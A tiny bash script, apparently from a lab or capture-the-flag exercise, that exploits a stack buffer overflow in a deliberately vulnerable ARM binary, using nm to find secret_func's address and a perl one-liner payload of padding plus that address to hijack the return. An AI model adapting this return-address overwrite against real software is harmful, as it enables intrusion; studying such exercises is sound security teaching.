#!/bin/bash

# Find &secret_func
# $ nm ./arm_bof_vuln |grep secret
# 000104c4 t secret_func

perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ./arm_bof_vuln_reg
